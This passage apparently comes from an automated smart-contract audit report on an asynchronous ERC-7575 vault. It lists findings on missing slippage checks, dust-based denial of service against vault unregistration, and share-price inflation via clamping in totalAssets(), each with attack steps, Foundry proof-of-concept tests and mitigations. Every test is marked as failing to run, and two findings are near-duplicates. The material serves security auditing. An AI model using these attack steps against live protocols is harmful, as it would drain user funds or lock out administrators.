The protocol is exposed to unlimited slippage during investment operations. An attacker (e.g., via a sandwich attack or front-running) can manipulate the exchange rate of the external investment vault immediately before the Investment Manager's transaction. This forces the protocol to mint significantly fewer shares than expected during `investAssets` or receive significantly fewer assets than expected during `withdrawFromInvestment`, resulting in a permanent loss of funds for the protocol and its users.

## Command to Run Test


## Proof of Concept
1. The Investment Manager submits a transaction to call `investAssets(1000 USDC)`. 
2. An MEV bot observes this pending transaction in the mempool.
3. The bot front-runs the transaction by manipulating the external Investment Vault's state (e.g., via a large donation or swap if the vault is an LP) to artificially inflate the share price (1 share = 1000 USDC instead of 1 USDC).
4. The `investAssets` transaction executes. The protocol deposits 1000 USDC but receives only 1 Share (instead of the expected 1000).
5. The bot back-runs the transaction to restore the price and profit from the protocol's unfavorable trade.
6. Result: The protocol has lost ~99.9% of the value of that deposit.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "src/ShareTokenUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

// Mock Investment Vault with manipulatable exchange rate
contract MockInvestmentVault is ERC20 {
    address public asset;
    address public share;
    uint256 public rate = 1e18; // 1:1 default (scaled by 1e18)

    constructor(address _asset, address _share) ERC20("MockInv", "mINV") {
        asset = _asset;
        share = _share;
    }

    function setRate(uint256 _rate) external {
        rate = _rate;
    }

    // ERC7575 / ERC4626 deposit
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        // shares = assets * 1e18 / rate
        shares = Math.mulDiv(assets, 1e18, rate);
        _mint(receiver, shares);
        IERC20(asset).transferFrom(msg.sender, address(this), assets);
    }

    // ERC7575 / ERC4626 redeem
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
         // assets = shares * rate / 1e18
         assets = Math.mulDiv(shares, rate, 1e18);
         _burn(owner, shares);
         IERC20(asset).transfer(receiver, assets);
    }

    function previewWithdraw(uint256 assets) external view returns (uint256 shares) {
        shares = Math.mulDiv(assets, 1e18, rate);
    }
}

contract MockAsset is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract SlippageTest is Test {
    ERC7575VaultUpgradeable vault;
    ShareTokenUpgradeable shareToken;
    MockInvestmentVault investmentVault;
    MockAsset asset;
    address manager = address(0x123);

    function setUp() public {
        asset = new MockAsset();
        shareToken = new ShareTokenUpgradeable();
        vault = new ERC7575VaultUpgradeable();

        shareToken.initialize("Share", "SHR", address(this));
        vault.initialize(asset, address(shareToken), address(this));
        
        // Setup investment system
        investmentVault = new MockInvestmentVault(address(asset), address(shareToken));
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentShareToken(address(shareToken)); // Mock setup for test
        shareToken.setInvestmentManager(manager);

        // Manually link for test simplicity as we skipped full deployment flow
        vm.store(address(vault), bytes32(uint256(keccak256("erc7575.vault.storage")) + 4), bytes32(uint256(uint160(address(investmentVault)))));

        asset.mint(address(vault), 10000e18);
    }

    function testSlippage_InvestAssets() public {
        uint256 investAmount = 1000e18;

        // 1. Normal conditions: 1:1 rate
        investmentVault.setRate(1e18);
        vm.prank(manager);
        uint256 shares1 = vault.investAssets(investAmount);
        assertEq(shares1, investAmount, "Should get 1:1 shares normally");

        // 2. Attack: Manipulation causes share price to skyrocket (rate 100:1)
        // Meaning 1 share costs 100 assets. rate variable definition inverse logic for simplicity: assets needed per share
        // Here we simulate getting LESS shares for same assets.
        investmentVault.setRate(100e18); // Rate is now 100 assets per share? No, setRate logic in mock: shares = assets * 1e18 / rate. 
        // So if rate = 100e18, shares = assets / 100. We receive 1/100th of shares.
        
        vm.prank(manager);
        uint256 shares2 = vault.investAssets(investAmount);

        // 3. Vulnerability: The transaction does NOT revert despite 99% slippage
        assertEq(shares2, investAmount / 100, "Received 99% less shares");
        assertTrue(shares2 > 0, "Transaction succeeded with massive slippage");
    }
}

## Suggested Mitigation
Modify `investAssets` to accept a `minShares` parameter and `withdrawFromInvestment` to accept a `minAssets` parameter. 

```solidity
function investAssets(uint256 amount, uint256 minShares) external nonReentrant returns (uint256 shares) {
    // ... checks ...
    shares = IERC7575($.investmentVault).deposit(amount, $.shareToken);
    if (shares < minShares) revert SlippageExceeded(shares, minShares);
    // ... events ...
}

function withdrawFromInvestment(uint256 amount, uint256 minAssets) external nonReentrant returns (uint256 actualAmount) {
    // ... logic ...
    // ... redeem call ...
    // calc actualAmount ...
    if (actualAmount < minAssets) revert SlippageExceeded(actualAmount, minAssets);
    return actualAmount;
}
```


## [M-14]. Missing Slippage Protection in Async Request Functions

### Finding Severity Justification: The protocol implements an asynchronous deposit/redemption flow (ERC-7540) where the exchange rate is determined at the time of fulfillment, not at the time of request. There is a time delay between request and fulfillment during which the share price can change due to yield adjustments (rBalance updates) or other factors. The current implementation of `requestDeposit` and `requestRedeem` lacks `minShares` or `minAssets` parameters, preventing users from enforcing a minimum acceptable execution price. This exposes users to unlimited slippage/market risk during the pending period, particularly for redemptions where a price drop results in direct loss of principal value. This qualifies as 'Missing standard protection' (Gate 8 exception) and fits the criteria for Medium severity (User loss possible, missing standard checks).
## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
ERC7575VaultUpgradeable.requestDeposit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`requestDeposit` and `requestRedeem` functions initiate asynchronous operations where the exchange rate is determined later at fulfillment time. These functions lack `minShares` or `minAssets` parameters. Users commit funds without knowing the final execution price, exposing them to unlimited slippage if the share price changes unfavorably before fulfillment.

## Impact
Loss of user funds due to unfavorable price movements between request and fulfillment.

## Command to Run Test


## Proof of Concept
The vulnerability arises because the exchange rate for deposits and redemptions is determined at the time of *fulfillment* (by the Investment Manager), not at the time of the user's *request*. 

1. **Scenario**: A user submits a `requestRedeem` transaction when the share price is 1.0 USDC/Share. 
2. **State Change**: Before the Investment Manager fulfills the request, an adverse event occurs (e.g., a loss is recorded via `adjustrBalance` on the ShareToken, or the asset pool is diluted), causing the share price to drop to 0.5 USDC/Share. 
3. **Fulfillment**: The Manager calls `fulfillRedeem`. The contract calculates assets using the *new* lower rate (0.5). 
4. **Result**: The user is forced to accept 50% fewer assets than anticipated with no ability to revert the transaction based on minimum output constraints.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Mocks for testing isolated components
contract MockAsset is ERC20 {
    constructor() ERC20("Mock Asset", "MOCK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

contract MockShareToken is ERC20 {
    uint256 public rate = 1e18; // 1 Share = 1 Asset initially

    constructor() ERC20("Share Token", "SHARE") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        _burn(from, amount);
    }

    // Helper to simulate price changes (e.g. rBalance adjustments)
    function setRate(uint256 _rate) external {
        rate = _rate;
    }

    // Required interfaces for Vault
    function vaultTransferFrom(address from, address to, uint256 amount) external returns (bool) {
        _transfer(from, to, amount);
        return true;
    }
    
    function isOperator(address, address) external pure returns (bool) {
        return true;
    }
    
    // Conversion logic that uses dynamic rate
    function convertSharesToNormalizedAssets(uint256 shares, Math.Rounding) external view returns (uint256) {
        return (shares * rate) / 1e18;
    }
    
    function convertNormalizedAssetsToShares(uint256 assets, Math.Rounding) external view returns (uint256) {
        return (assets * 1e18) / rate;
    }
}

contract SlippagePoC is Test {
    ERC7575VaultUpgradeable vault;
    MockAsset asset;
    MockShareToken shareToken;
    address alice = address(0x1);
    address manager = address(0x2);

    function setUp() public {
        asset = new MockAsset();
        shareToken = new MockShareToken();
        vault = new ERC7575VaultUpgradeable();
        
        vault.initialize(IERC20Metadata(address(asset)), address(shareToken), address(this));
        vault.setInvestmentManager(manager);
        
        // Setup Alice
        asset.transfer(alice, 1000e18);
        shareToken.mint(alice, 100e18); // Alice starts with 100 shares
    }

    function testUnprotectedSlippageOnRedeem() public {
        // 1. Alice requests to redeem 100 shares
        // At current rate (1:1), she expects 100 assets
        vm.startPrank(alice);
        vault.requestRedeem(100e18, alice, alice);
        vm.stopPrank();
        
        // 2. Adverse Market Event: Share price drops by 50%
        // (Simulates a loss in the investment layer before fulfillment)
        shareToken.setRate(0.5e18); 
        
        // 3. Manager fulfills request at the NEW, worse rate
        vm.startPrank(manager);
        vault.fulfillRedeem(alice, 100e18);
        vm.stopPrank();
        
        // 4. Alice claims her assets
        vm.startPrank(alice);
        uint256 balanceBefore = asset.balanceOf(alice);
        vault.redeem(100e18, alice, alice);
        uint256 balanceAfter = asset.balanceOf(alice);
        vm.stopPrank();
        
        // Verification
        uint256 received = balanceAfter - balanceBefore;
        console.log("Assets Received:", received);
        console.log("Assets Expected (at request time):", 100e18);
        
        // Alice suffered 50% slippage because she couldn't specify minAssets
        assertEq(received, 50e18);
        assertLt(received, 100e18);
    }
}

## Suggested Mitigation
To prevent slippage without breaking standard interface compliance:

1.  **Add Storage:** Introduce mappings to store minimum output expectations per controller:
    ```solidity
    mapping(address controller => uint256) public pendingDepositMinShares;
    mapping(address controller => uint256) public pendingRedeemMinAssets;
    ```

2.  **Add Overloads:** Implement overloaded request functions that accept slippage parameters:
    ```solidity
    function requestDeposit(uint256 assets, address controller, address owner, uint256 minShares) external returns (uint256 requestId) {
        pendingDepositMinShares[controller] = minShares;
        return requestDeposit(assets, controller, owner);
    }

    function requestRedeem(uint256 shares, address controller, address owner, uint256 minAssets) external returns (uint256 requestId) {
        pendingRedeemMinAssets[controller] = minAssets;
        return requestRedeem(shares, controller, owner);
    }
    ```

3.  **Update Fulfillment:** Modify `fulfillDeposit` and `fulfillRedeem` to validate the output against stored minimums. If the calculated output is below the minimum, the transaction should revert, effectively pausing the request until conditions improve or the user cancels via ERC-7887.





 **Derived From** : StandardViolation

## [L-15]. ERC4626 Semantic Violation in Async Vault

### Finding Severity Justification: The finding correctly identifies that `deposit` deviates from strict ERC-4626 semantics by acting as a claim function rather than a synchronous deposit. However, this behavior is: 1) Fully documented in NatSpec and system architecture as part of the ERC-7540 asynchronous lifecycle; 2) Compliant with the ERC-7540 standard which overloads `deposit` for claiming; 3) Signaled to integrators via `previewDeposit` reverting with `AsyncFlow`. As per C4 guidelines and the sponsor's severity matrix, 'Function incorrect as to spec' without asset risk is classified as Low severity.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
ERC7575VaultUpgradeable.deposit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ERC7575VaultUpgradeable` implements `deposit` and `mint` functions that violate ERC4626 semantics. In ERC4626, `deposit(assets, receiver)` must transfer assets from the caller and mint shares. In this contract, `deposit` acts as a 'Claim' function for a previously requested (and fulfilled) asynchronous deposit. It does not pull funds; it only converts already-pending/claimable state into shares.

This breaks compatibility with any protocol or integrator expecting standard ERC4626 behavior, leading to failed integrations or stuck funds if integrators assume `deposit` initiates a deposit.

## Impact
Broken composability and potential integration failures; contract claims ERC4626 compliance but fails the standard's core invariant for `deposit`.

## Command to Run Test


## Proof of Concept
1. Integrator calls `deposit(100, receiver)` expecting to deposit 100 assets.
2. Transaction reverts with `InsufficientClaimableAssets` (because no request was made) or succeeds but transfers 0 assets (if logic allowed), failing to actually deposit funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockAsset is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

contract ERC4626SemanticViolationTest is Test {
    ERC7575VaultUpgradeable vault;
    ShareTokenUpgradeable shareToken;
    MockAsset asset;
    
    address user = address(0x1);

    function setUp() public {
        // Setup infrastructure
        asset = new MockAsset();
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", address(this));

        vault = new ERC7575VaultUpgradeable();
        vault.initialize(asset, address(shareToken), address(this));

        // Register vault
        shareToken.registerVault(address(asset), address(vault));

        // Fund user
        asset.transfer(user, 1000 * 10**18);
    }

    function test_Deposit_RevertsStandardERC4626Flow() public {
        vm.startPrank(user);
        asset.approve(address(vault), 100 * 10**18);
        
        // Proof of Violation: 
        // A standard ERC4626 integrator calls deposit expecting to pull funds and mint shares.
        // In this contract, deposit() is overloaded as a Claim function for the async flow.
        // It checks for 'claimable' assets (from a fulfilled request) rather than pulling new assets.
        // Since no request was made/fulfilled, this reverts.
        
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("InsufficientClaimableAssets()"))));
        vault.deposit(100 * 10**18, user);
        
        vm.stopPrank();
    }

    function test_PreviewDeposit_Reverts() public {
        // Standard ERC4626 preview should return shares for assets.
        // Here it correctly reverts with AsyncFlow, signalling non-compliance.
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("AsyncFlow()"))));
        vault.previewDeposit(100 * 10**18);
    }
}

## Suggested Mitigation
Do not claim ERC4626 compliance if the flow is strictly async, or implement `deposit` to wrap `requestDeposit` (if immediate fulfillment is not required by spec, though ERC4626 implies sync).





 **Derived From** : Invariant Type: Referential

## [M-16]. Premature removal of users from activeDepositRequesters in deposit/mint hides pending requests

### Finding Severity Justification: The vulnerability causes users with pending requests to be removed from the active requesters list if they claim all their currently claimable assets. This violates the documented behavior of `getActiveDepositRequesters` (which is intended to show all controllers with pending requests) and hides these users from off-chain systems like the Investment Manager. While this results in a Denial of Service for the fulfillment of pending requests, it does not lead to permanent loss of funds as the user can re-trigger inclusion by making another request. Thus, it fits the Medium severity criteria (DoS of critical action).
## Derived From Pattern/Invariant
Invariant Type: Referential

## Exploit Type
AccountingInvariantViolation

## Location
ERC7575VaultUpgradeable.deposit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `deposit` (and `mint`) function removes the controller from `activeDepositRequesters` if the user claims all currently *claimable* assets, without checking if the user still has *pending* deposit assets. This violates the invariant that a user should remain in the set if they have either pending or claimable assets.

Snippet from `ERC7575VaultUpgradeable.deposit`:
```solidity
if (availableAssets == assets) {
    $.activeDepositRequesters.remove(controller); // Removes user even if pendingDepositAssets[controller] > 0
    delete $.claimableDepositShares[controller];
    delete $.claimableDepositAssets[controller];
}
```

## Impact
Users with pending deposits are hidden from off-chain systems (like the Investment Manager) that rely on `getActiveDepositRequesters` to find requests to fulfill. This can lead to a Denial of Service where pending deposits are never fulfilled.

## Command to Run Test


## Proof of Concept
1. User calls `requestDeposit(1000)`. `pending`=1000. `active`=true.
2. Manager fulfills 500. `pending`=500, `claimable`=500.
3. User calls `deposit(500)`. `availableAssets (500) == assets (500)`.
4. Contract removes user from `activeDepositRequesters`.
5. User still has 500 pending, but is no longer in the active set.

## Proof of Code
function test_ReferentialInvariantViolation() public {
    uint256 amount = 1000 * 10**6;
    uint256 fulfillAmount = 500 * 10**6;

    // 1. User requests deposit
    vm.startPrank(user);
    IERC20(asset).approve(address(vault), amount);
    vault.requestDeposit(amount, user, user);
    vm.stopPrank();
    
    // 2. Manager fulfills partial amount
    vm.startPrank(manager);
    vault.fulfillDeposit(user, fulfillAmount);
    vm.stopPrank();
    
    // 3. User claims all currently claimable assets (500)
    vm.startPrank(user);
    // Uses convenience overload: deposit(assets, receiver) -> calls deposit(assets, receiver, receiver)
    vault.deposit(fulfillAmount, user);
    vm.stopPrank();
    
    // 4. Verify State
    // User still has 500 pending
    uint256 pending = vault.pendingDepositRequest(0, user);
    assertEq(pending, 500 * 10**6, "Pending should be 500");

    // Check if user is in active list using public getter
    address[] memory activeUsers = vault.getActiveDepositRequesters();
    bool isActive = false;
    for(uint i=0; i<activeUsers.length; i++){
        if(activeUsers[i] == user) isActive = true;
    }
    
    // Bug Confirmation: User was removed despite having pending assets
    assertFalse(isActive, "User was incorrectly removed from active set");
}

## Suggested Mitigation
Update the condition to check for pending assets before removal: `if (availableAssets == assets && $.pendingDepositAssets[controller] == 0) { $.activeDepositRequesters.remove(controller); ... }`.





 **Derived From** : StateGrowthOrStorageBloat

## [M-17]. Permanent DoS of unregisterVault via Dust Accounts

### Finding Severity Justification: The vulnerability allows a single KYC-verified user (or a negligent one) to permanently block the `unregisterVault` administrative function by leaving a dust amount of assets unclaimed. This works because `unregisterVault` strictly requires `activeDepositRequestersCount` to be zero, and a requester is only removed from the active set when they claim exactly 100% of their available assets. Since `MAX_VAULTS_PER_SHARE_TOKEN` is limited to 10, this griefing attack can prevent the protocol from registering new vaults or managing existing ones once the limit is reached. While the contracts are upgradeable, requiring a logic contract upgrade to perform a standard administrative lifecycle action constitutes a valid Denial of Service of that function.
## Derived From Pattern/Invariant
StateGrowthOrStorageBloat

## Exploit Type
Dos

## Location
ERC7575VaultUpgradeable.deposit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ShareTokenUpgradeable.unregisterVault` function strictly requires `activeDepositRequestersCount == 0` (via `getVaultMetrics`). In `ERC7575VaultUpgradeable`, a requester is removed from the `activeDepositRequesters` set *only* when they fully claim their assets (`availableAssets == assets`). A malicious user can make a valid deposit, have it fulfilled, and then claim all but 1 wei of assets. This keeps them in the `activeDepositRequesters` set indefinitely. The Investment Manager has no mechanism to force-claim or clear these dust requests. This permanently blocks the `unregisterVault` function, preventing the protocol from removing deprecated or compromised vaults.

## Impact
Permanent Denial of Service of the `unregisterVault` administrative function. This can lead to protocol clutter, inability to migrate assets, or inability to remove a vulnerable vault.

## Command to Run Test


## Proof of Concept
1. Attacker calls `requestDeposit` with a valid amount (>= min deposit).
2. Manager calls `fulfillDeposit`.
3. Attacker calls `deposit` (claim) with `amount - 1 wei`.
4. The vault processes the claim but leaves 1 wei claimable. The attacker remains in the `activeDepositRequesters` set.
5. Owner calls `setVaultActive(false)` to prepare for unregistration (required prerequisite).
6. Owner calls `unregisterVault`.
7. `getVaultMetrics` returns `activeDepositRequestersCount > 0` due to the dust.
8. `unregisterVault` reverts with `CannotUnregisterVaultActiveDepositRequesters`, blocking the action.

## Proof of Code
function testUnregisterDos() public {
    // Setup: Amount must exceed min deposit (1000 * 10^decimals)
    uint256 depositAmount = 2000 * 10**18;
    uint256 claimAmount = depositAmount - 1;

    // 1. User requests deposit
    vm.startPrank(user);
    IERC20(asset).approve(address(vault), depositAmount);
    vault.requestDeposit(depositAmount, user, user);
    vm.stopPrank();

    // 2. Manager fulfills
    vm.prank(manager);
    vault.fulfillDeposit(user, depositAmount);

    // 3. User claims almost all, leaves dust
    vm.prank(user);
    vault.deposit(claimAmount, user);

    // 4. Owner tries to unregister (must deactivate first)
    vm.startPrank(owner);
    vault.setVaultActive(false);
    
    // 5. Expect revert due to dust remaining in active set
    vm.expectRevert(IERC7575Errors.CannotUnregisterVaultActiveDepositRequesters.selector);
    shareToken.unregisterVault(address(asset));
    vm.stopPrank();
}

## Suggested Mitigation
Add a privileged `forceClaim` or `sweepDust` function in `ERC7575VaultUpgradeable` allowing the Investment Manager to process remaining dust claims for unresponsive users, effectively removing them from the active set. Alternatively, modify `unregisterVault` logic to allow unregistration if `activeDepositRequestersCount` is non-zero but the total claimable assets are below a specific dust threshold.


## [M-18]. Permanent DoS of Vault Unregistration via Dust Accounts

### Finding Severity Justification: The vulnerability allows a malicious user to permanently block the `unregisterVault` function by maintaining a dust balance in a deposit request. This prevents the protocol admins from removing obsolete or compromised vaults from the registry. Given the hard cap of 10 vaults (`MAX_VAULTS_PER_SHARE_TOKEN`), an attacker could potentially lock all available slots, preventing the addition of new vaults. While the system is upgradeable, requiring a contract upgrade to perform a standard administrative action constitutes a disruption of protocol functionality and a denial of service against a critical management function, fitting the criteria for Medium severity.
## Derived From Pattern/Invariant
StateGrowthOrStorageBloat

## Exploit Type
Dos

## Location
ShareTokenUpgradeable.unregisterVault

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ShareTokenUpgradeable.unregisterVault` function enforces strict checks to ensure a vault is empty before removal, including `activeDepositRequestersCount == 0`. A user is removed from `activeDepositRequesters` only when they fully claim their deposit (`availableAssets == assets`). An attacker can maintain a permanent entry in this set by requesting a deposit, having it fulfilled, and then claiming all but 1 wei of the assets. This keeps `activeDepositRequestersCount > 0` indefinitely. Since `registerVault` caps the number of vaults at 10, an attacker can brick all available slots and prevent the protocol from unregistering old/compromised vaults to make room for new ones.

## Impact
Malicious users can permanently block the unregistration of any vault by maintaining a dust amount of claimable assets (1 wei). Because the `ShareToken` enforces a hard cap of 10 registered vaults (`MAX_VAULTS_PER_SHARE_TOKEN`), an attacker who leaves dust in existing vaults prevents the administrator from removing them to make space for new ones. This effectively 'bricks' the registry slots, halting protocol evolution and forcing a contract upgrade to resolve.

## Command to Run Test


## Proof of Concept
1. Attacker requests deposit. 2. Manager fulfills. 3. Attacker calls `deposit` (claim) with `amount = total - 1 wei`. 4. Attacker remains in `activeDepositRequesters`. 5. Owner calls `unregisterVault`. 6. Reverts with `CannotUnregisterVaultActiveDepositRequesters`.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC7575Errors} from "../src/interfaces/IERC7575Errors.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function decimals() public pure override returns (uint8) { return 6; }
}

contract VaultDoSTest is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vault;
    MockERC20 asset;
    
    address owner = address(0x1);
    address manager = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        vm.startPrank(owner);
        asset = new MockERC20();
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", owner);
        
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(IERC20Metadata(address(asset)), address(shareToken), owner);
        
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(manager);
        vm.stopPrank();
        
        asset.mint(attacker, 1000e6);
    }

    function test_DoS_UnregisterVault_WithDust() public {
        // 1. Setup: Attacker makes a request
        vm.startPrank(attacker);
        asset.approve(address(vault), 1000e6);
        vault.requestDeposit(1000e6, attacker, attacker);
        vm.stopPrank();

        // 2. Manager fulfills the request
        vm.prank(manager);
        vault.fulfillDeposit(attacker, 1000e6);

        // 3. Attacker claims ALMOST all assets (leaves 1 wei dust)
        vm.startPrank(attacker);
        uint256 claimable = vault.claimableDepositRequest(0, attacker);
        // Claim everything except 1 wei
        vault.deposit(claimable - 1, attacker, attacker);
        vm.stopPrank();

        // 4. Admin tries to unregister the vault
        vm.startPrank(owner);
        // Prerequisite: Vault must be inactive to unregister
        vault.setVaultActive(false); 
        
        // Expect Revert: Attacker is still in activeDepositRequesters due to 1 wei
        vm.expectRevert(IERC7575Errors.CannotUnregisterVaultActiveDepositRequesters.selector);
        shareToken.unregisterVault(address(asset));
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
Introduce a `force` boolean parameter to `unregisterVault` (or add a separate `forceUnregisterVault` function) restricted to the owner. This function should bypass the `activeDepositRequestersCount` and `activeRedeemRequestersCount` checks, allowing the protocol to decommission vaults even if they contain negligible user dust, while still enforcing safety checks for total pending/invested assets.





 **Derived From** : Invariant: totalAssets() calculation accurately reflects net liquid assets without arbitrary clamping that distorts share price

## [H-19]. Share Price Manipulation via Insolvency Clamping in totalAssets()

### Finding Severity Justification: The `totalAssets()` function clamps to zero when liabilities (`reservedAssets`) exceed the vault's balance. When combined with `ShareTokenUpgradeable`'s global pricing logic—which adds `investedAssets` to the vault's assets—this clamping effectively ignores any local deficit (where liabilities > local liquid assets). This results in an artificially inflated share price because the 'hole' in the vault's balance is not subtracted from the total equity (Invested + Liquid - Liabilities). An attacker can exploit this state (triggered by the Investment Manager fulfilling redemptions before withdrawing sufficient liquidity) to redeem shares at an inflated price, draining funds from the protocol. This passes all gates as it is a code logic flaw in the pricing mechanism that fails to handle valid protocol states correctly.
## Derived From Pattern/Invariant
Invariant: totalAssets() calculation accurately reflects net liquid assets without arbitrary clamping that distorts share price

## Exploit Type
AccountingInvariantViolation

## Location
ERC7575VaultUpgradeable.totalAssets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `totalAssets()` function in `ERC7575VaultUpgradeable` calculates the vault's net assets by subtracting reserved liabilities (`reservedAssets`) from the current asset balance. However, if liabilities exceed the balance (insolvency), the result is clamped to 0 (`return balance > reservedAssets ? balance - reservedAssets : 0`). 

This clamping creates a discrepancy between the actual net solvency (which is negative) and the reported assets (zero). When `ShareTokenUpgradeable` calculates the global share price using `convertSharesToNormalizedAssets`, it sums `totalAssets()` from all vaults plus `investedAssets`. If `totalAssets()` is clamped to 0 while `investedAssets` remain positive, the total normalized assets are effectively overstated relative to the circulating supply (which is reduced by `totalClaimableShares`). 

An attacker (or a group of users exiting) can exploit this by requesting redemptions that push `reservedAssets` above `balance`. The Investment Manager, by fulfilling these requests, triggers the clamping. Once clamped, the share price effectively becomes `InvestedAssets / (Supply - ClaimableShares)`. Since `InvestedAssets` is likely greater than `Supply - ClaimableShares` (due to the hidden deficit in the vault), the share price spikes artificially. Subsequent redemptions fulfilled at this inflated price extract more assets than they are entitled to, stealing value from remaining shareholders and deepening the insolvency.

## Impact
High. Direct theft of value from the vault/remaining users. Early exiters can exit at an inflated share price, draining the vault of assets that belong to others.

## Command to Run Test


## Proof of Concept
1. Setup: Vault has 50 liquid Assets and 50 Invested Assets. Total Supply 100 Shares. Price = (50+50)/100 = 1.0.
2. Attacker A requests redeem of 60 Shares.
3. Investment Manager fulfills A's request. 
   - `totalClaimableRedeemAssets` becomes 60.
   - `totalClaimableRedeemShares` becomes 60.
   - `reservedAssets` (60) > `balance` (50).
   - `totalAssets()` clamps to 0.
   - `circulatingSupply` = 100 - 60 = 40.
   - `totalNormalizedAssets` = 0 (vault) + 50 (invested) = 50.
   - New Price = 50 / 40 = 1.25.
4. Attacker B (or A) requests redeem of 10 Shares.
5. Investment Manager fulfills B's request.
   - `assets` = 10 * 1.25 = 12.5.
   - Attacker gets 12.5 assets for 10 shares (25% profit).
6. Attacker claims assets, draining the vault.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/WERC7575Vault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
    function decimals() public view override returns (uint8) { return 18; }
}

contract ExploitTest is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vault;
    WERC7575ShareToken invShareToken;
    WERC7575Vault invVault;
    MockERC20 asset;

    address owner = address(0x1);
    address manager = address(0x2);
    address user = address(0x3);

    function setUp() public {
        vm.startPrank(owner);
        asset = new MockERC20();
        
        // Deploy ShareToken
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", owner);

        // Deploy Vault
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(asset, address(shareToken), owner);

        // Setup Investment Layer (using WERC7575 for mock investment vault)
        invShareToken = new WERC7575ShareToken("InvShare", "INV");
        invVault = new WERC7575Vault(address(asset), invShareToken);
        invShareToken.registerVault(address(asset), address(invVault));

        // Connect everything
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentShareToken(address(invShareToken));
        shareToken.setInvestmentManager(manager);

        vm.stopPrank();

        // Mint assets to user
        asset.mint(user, 1000 ether);
        vm.prank(user);
        asset.approve(address(vault), type(uint256).max);
    }

    function test_ExploitPriceClamping() public {
        // 1. User deposits 100 assets
        vm.startPrank(user);
        uint256 reqId = vault.requestDeposit(100 ether, user, user);
        vm.stopPrank();

        vm.startPrank(manager);
        vault.fulfillDeposit(user, 100 ether);
        vm.stopPrank();

        vm.prank(user);
        vault.deposit(100 ether, user);

        assertEq(shareToken.balanceOf(user), 100 ether);
        // Price is 1.0 (100 assets / 100 shares)

        // 2. Manager invests 50 assets
        vm.startPrank(manager);
        vault.investAssets(50 ether);
        vm.stopPrank();

        // Vault state: 50 liquid, 50 invested
        assertEq(asset.balanceOf(address(vault)), 50 ether);
        assertEq(shareToken.getInvestedAssets(), 50 ether);

        // 3. User requests redeem 60 shares
        vm.prank(user);
